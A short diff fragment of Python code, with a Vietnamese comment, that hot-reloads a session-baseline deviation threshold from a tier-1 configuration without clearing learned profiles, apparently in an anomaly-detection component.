+        # Nạp nóng tham số SessionBaseline mà không xoá hồ sơ đã học
         baseline_config = tier1_config.get("session_baseline", {})
         self.session_baseline.deviation_threshold = baseline_config.get(
             "deviation_threshold", self.session_baseline.deviation_threshold
